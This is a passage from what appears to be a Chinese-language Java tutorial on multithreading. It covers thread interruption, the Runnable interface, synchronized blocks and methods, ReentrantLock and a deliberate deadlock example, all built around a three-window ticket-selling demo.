class="hljs-doctag">@Description</span> #TODO</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.isInterrupted())&#123;<span class="hljs-comment">//判断正在执行的线程状态是否标记为停止</span><br>                System.out.println(<span class="hljs-string">&quot;已经是停止状态类，退出！&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<span class="hljs-comment">//调出循环</span><br>            &#125;<br>            System.out.println(<span class="hljs-string">&quot;i: &quot;</span> + i);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;结束循环后的代码位置&quot;</span>);<br>    &#125;<br>&#125;<br>------------------------------------------------<br><span class="hljs-keyword">package</span> demo04;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  线程测试类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>();<span class="hljs-comment">//创建线程</span><br>        t01.start();<br>        Thread.sleep(<span class="hljs-number">10</span>);<br>        t01.interrupt();<span class="hljs-comment">//将线程标记为停止线程</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="425621ac"></a></p><h3 id="1-9-多线程的实现方式二"><a href="#1-9-多线程的实现方式二" class="headerlink" title="1.9 - 多线程的实现方式二"></a>1.9 - 多线程的实现方式二</h3><ul><li>实现Runnable接口<br>1、自定义MyRunnable类，去实现Runnable接口<br>2、在MyRunnable类中重写run方法<br>3、在测试类中创建Thread类的对象，并将MyRunnable类的对象作为参数传递到Thread类的构造方法中<br>4、启动线程</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo05;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  实现的方式创建多线程</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRunnable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++) &#123;<br>            System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;= &quot;</span> + i);<br>        &#125;<br>    &#125;<br>&#125;<br>-------------------------------------------<br><span class="hljs-keyword">package</span> demo05;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">MyRunnable</span> <span class="hljs-variable">myRun</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyRunnable</span>();<span class="hljs-comment">//构造对象，将任务提取成对象，让多个线程一同使用</span><br><br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">t01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(myRun, <span class="hljs-string">&quot;线程01&quot;</span>);<span class="hljs-comment">//创建线程</span><br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">t02</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(myRun, <span class="hljs-string">&quot;线程02&quot;</span>);<span class="hljs-comment">//创建线程</span><br><br>        <span class="hljs-comment">//启动线程</span><br>        t01.start();<br>        t02.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>多线程实现方式 </p><ul><li><p>继承Thread类</p></li><li><p>实现Runnable接口</p><pre><code class="hljs">  继承是多个线程分别完成自己的任务，虽然执行的是一个类中的方法，但是资源相对独立，相当于创建N个任务由N个线程来执行。&lt;br /&gt;         实现是多个线程共同完成一个任务，使用的都是Runnable的资源，他们的资源是共享的，完成的是同一个任务，相当于N个线程执行同1个任务。</code></pre><p>  <a name="325654a3"></a></p></li></ul></li></ul><h2 id="2-线程同步"><a href="#2-线程同步" class="headerlink" title="2 - 线程同步"></a>2 - 线程同步</h2><p><a name="46f82cc0"></a></p><h3 id="2-1-卖票案例"><a href="#2-1-卖票案例" class="headerlink" title="2.1 - 卖票案例"></a>2.1 - 卖票案例</h3><p>需求：德云社北展剧场有一场演出，设置100张特价门票，三个销售点同时卖。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo06;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  线程类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SellTickets</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">tickets</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<span class="hljs-comment">//设置的100张特价门票</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>)&#123;<span class="hljs-comment">//同步语句块</span><br>                <span class="hljs-comment">//卖票动作</span><br>                <span class="hljs-keyword">if</span>(tickets &gt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//判断是否有票</span><br>                    System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;正在售出第&quot;</span> + tickets + <span class="hljs-string">&quot;号特价门票&quot;</span>);<br>                    tickets--;<span class="hljs-comment">//票卖一张少一张</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">500</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>----------------------------------<br><span class="hljs-keyword">package</span> demo06;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  卖票测试类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SellTicketsTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">SellTickets</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SellTickets</span>();<span class="hljs-comment">//提取任务类对象</span><br><br>        <span class="hljs-comment">//创建线程</span><br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">win01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(st, <span class="hljs-string">&quot;潘家园&quot;</span>);<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">win02</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(st, <span class="hljs-string">&quot;文化宫&quot;</span>);<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">win03</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(st, <span class="hljs-string">&quot;回龙观&quot;</span>);<br><br>        <span class="hljs-comment">//开启线程</span><br>        win01.start();<br>        win02.start();<br>        win03.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="241cec3d"></a></p><h3 id="2-2-数据安全问题"><a href="#2-2-数据安全问题" class="headerlink" title="2.2 - 数据安全问题"></a>2.2 - 数据安全问题</h3><ul><li>是否具备多线程环境</li><li>是否有共享数据</li><li>是否有多条语句操作共享数据</li></ul><blockquote><p>使用同步语句块<code>synchronized(任意对象)&#123;&#125;</code></p></blockquote><p><a name="804930a6"></a></p><h3 id="2-3-线程同步的利弊"><a href="#2-3-线程同步的利弊" class="headerlink" title="2.3 - 线程同步的利弊"></a>2.3 - 线程同步的利弊</h3><ul><li>好处：解决线程同步的数据安全问题</li><li>弊端：当线程很多的时候，每个线程都会去判断同步语句块上的这把锁，很耗费资源，降低运行效率<br>  <a name="2c16fe32"></a></li></ul><h3 id="2-4-同步方式"><a href="#2-4-同步方式" class="headerlink" title="2.4 - 同步方式"></a>2.4 - 同步方式</h3><ul><li>同步语句块：<code>synchronized (this)&#123;//同步语句块&#125;</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>)&#123;<span class="hljs-comment">//同步语句块</span><br>               <span class="hljs-comment">//卖票动作</span><br>               <span class="hljs-keyword">if</span>(tickets &gt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//判断是否有票</span><br>                   System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;正在售出第&quot;</span> + tickets + <span class="hljs-string">&quot;号特价门票&quot;</span>);<br>                   tickets--;<span class="hljs-comment">//票卖一张少一张</span><br>               &#125;<br>           &#125;<br></code></pre></td></tr></table></figure><ul><li>普通同步方法：<code>修饰符 synchronized 返回值类型 方法名（形参列表）&#123;方法体&#125;</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//普通同步方法</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sellTickets</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span>(tickets &gt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//判断是否有票</span><br>            System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;正在售出第&quot;</span> + tickets + <span class="hljs-string">&quot;号特价门票&quot;</span>);<br>            tickets--;<span class="hljs-comment">//票卖一张少一张</span><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><ul><li>静态同步方法：<code>修饰符 synchronized static 返回值类型 方法名（形参列表）&#123;方法体&#125;</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//静态同步方法</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sellTickets</span><span class="hljs-params">()</span> &#123;<br>       <span class="hljs-keyword">if</span>(tickets &gt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//判断是否有票</span><br>           System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;正在售出第&quot;</span> + tickets + <span class="hljs-string">&quot;号特价门票&quot;</span>);<br>           tickets--;<span class="hljs-comment">//票卖一张少一张</span><br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p><a name="3fcaaed5"></a></p><h3 id="2-5-Lock"><a href="#2-5-Lock" class="headerlink" title="2.5 - Lock"></a>2.5 - Lock</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo06;<br><br><span class="hljs-keyword">import</span> java.util.concurrent.locks.Lock;<br><span class="hljs-keyword">import</span> java.util.concurrent.locks.ReentrantLock;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  线程类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SellTickets</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">tickets</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<span class="hljs-comment">//设置的100张特价门票</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();<span class="hljs-comment">//创建Lock对象，比较灵活</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br><span class="hljs-comment">//            synchronized (this)&#123;//同步语句块</span><br>                 lock.lock();<span class="hljs-comment">//上锁</span><br>                <span class="hljs-comment">//卖票动作</span><br>                <span class="hljs-keyword">if</span>(tickets &gt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//判断是否有票</span><br>                    System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;正在售出第&quot;</span> + tickets + <span class="hljs-string">&quot;号特价门票&quot;</span>);<br>                    tickets--;<span class="hljs-comment">//票卖一张少一张</span><br>                &#125;<br><span class="hljs-comment">//                lock.unlock();//解锁，千万不要忘记解锁，否则其它线程无法进来</span><br><span class="hljs-comment">//            &#125;</span><br><br><span class="hljs-comment">//            sellTickets();//定义普通同步方法</span><br><br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">500</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>----------------------------------<br><span class="hljs-keyword">package</span> demo06;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  卖票测试类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SellTicketsTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">SellTickets</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SellTickets</span>();<span class="hljs-comment">//提取任务类对象</span><br><br>        <span class="hljs-comment">//创建线程</span><br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">win01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(st, <span class="hljs-string">&quot;潘家园&quot;</span>);<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">win02</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(st, <span class="hljs-string">&quot;文化宫&quot;</span>);<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">win03</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(st, <span class="hljs-string">&quot;回龙观&quot;</span>);<br><br>        <span class="hljs-comment">//开启线程</span><br>        win01.start();<br>        win02.start();<br>        win03.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="83e1aa18"></a></p><h3 id="2-6-死锁"><a href="#2-6-死锁" class="headerlink" title="2.6 - 死锁"></a>2.6 - 死锁</h3><ul><li>形成原因：<ul><li>当两个或多个线程互相锁定时就形成了死锁。</li></ul></li><li>避免死锁的原则<ul><li>顺序上锁，反向解锁</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo06;<br><br><span class="hljs-keyword">import</span> java.util.concurrent.locks.Lock;<br><span class="hljs-keyword">import</span> java.util.concurrent.locks.ReentrantLock;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  线程类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SellTickets</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">tickets</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<span class="hljs-comment">//设置的100张特价门票</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();<span class="hljs-comment">//创建Lock对象，比较灵活</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock02</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock03</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock04</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            <span class="hljs-keyword">synchronized</span> (lock01)&#123;<span class="hljs-comment">//同步语句块</span><br>                <span class="hljs-keyword">if</span>(tickets &gt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//判断是否有票     //t02锁住了lock01</span><br>                    <span class="hljs-keyword">synchronized</span> (lock02)&#123;<br>                        System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;正在售出第&quot;</span> + tickets + <span class="hljs-string">&quot;号特价门票&quot;</span>);<br>                        tickets--;<span class="hljs-comment">//票卖一张少一张</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">synchronized</span> (lock03)&#123;<span class="hljs-comment">//同步语句块</span><br>                <span class="hljs-comment">//卖票动作</span><br>                <span class="hljs-keyword">if</span>(tickets &gt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//判断是否有票</span><br>                    <span class="hljs-keyword">synchronized</span> (lock04)&#123;      <span class="hljs-comment">//t01锁住了lock02</span><br>                        System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;正在售出第&quot;</span> + tickets + <span class="hljs-string">&quot;号特价门票&quot;</span>);<br>                        tickets--;<span class="hljs-comment">//票卖一张少一张</span><br>                    &#125;<br>                &#125;<br>            &#125;<br><span class="hljs-comment">//            sellTickets();//定义普通同步方法</span><br><br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">500</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//普通同步方法</span><br><span class="hljs-comment">//    private synchronized void sellTickets() &#123;</span><br>    <span class="hljs-comment">//静态同步方法</span><br><span class="hljs-comment">//    private synchronized static void sellTickets() &#123;</span><br><span class="hljs-comment">//        if(tickets &gt; 0)&#123;//判断是否有票</span><br><span class="hljs-comment">//            System.out.println(Thread.currentThread().getName() + &quot;正在售出第&quot; + tickets + &quot;号特价门票&quot;);</span><br><span class="hljs-comment">//            tickets--;//票卖一张少一张</span><br><span class="hljs-comment">//        &#125;</span><br><span class="hljs-comment">//    &#125;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><a name="337fd4ba"></a></p><h2 id="3-生产者与消费者"><a href="#3-生产者与消费者" class="headerlink" title="3 - 生产者与消费者"></a>3 - 生产者与消费者</h2><p>生产者与消费者模式是并发、多线程编程中经典的设计模式，通过wait和notifyAll方法实现的。<br>简单来说，就是一个类负责生产，一个类负责消费，当生产者生产出商品后，需要等待消费者将商品消费掉。当消费者没有可以消费的商品时，需要等待生产者生产出商品，这其中就存在着线程之间协调配合的过程。</p><blockquote><p>针对一个奶箱，送一瓶，才能取一瓶。<br>没送的话，取不到。<br>没取的话，也送不了</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span 